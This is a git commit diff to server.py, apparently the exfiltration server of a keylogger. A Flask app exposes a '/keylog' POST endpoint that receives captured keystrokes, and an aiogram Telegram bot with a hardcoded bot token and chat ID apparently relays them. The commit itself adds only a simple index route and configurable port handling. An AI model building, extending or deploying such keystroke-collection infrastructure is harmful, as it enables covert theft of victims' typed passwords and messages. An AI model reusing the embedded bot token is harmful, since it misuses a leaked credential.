c9f7bfd34670f54c891e8e021ddf1421f851cdd1
redmeet288 <154670406+redmeet288@users.noreply.github.com>
2025-07-02 14:42:27 +0200

    server.py

--- server.py
+++ server.py
@@ -5,6 +5,7 @@ from aiogram.client.default import DefaultBotProperties
 from aiogram.fsm.storage.memory import MemoryStorage
 import threading
 import asyncio
+import os
 
 TOKEN = "6904720328:AAHdFOlcIoO1r_AaF9JtU0bONBs0Yn3NiZM"
 CHAT_ID = 1497603032
@@ -17,6 +18,12 @@ aiogram_loop = asyncio.new_event_loop()
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher(storage=MemoryStorage())
 
+
+@app.route('/')
+def index():
+    return 'Сервер запущен и'
+
+
 @app.route('/keylog', methods=['POST'])
 def keylog():
     data = request.data.decode('utf-8')
@@ -28,7 +35,8 @@ def keylog():
     return 'OK'
 
 def run_flask():
-    app.run(host='0.0.0.0', port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
 
 async def main():
 
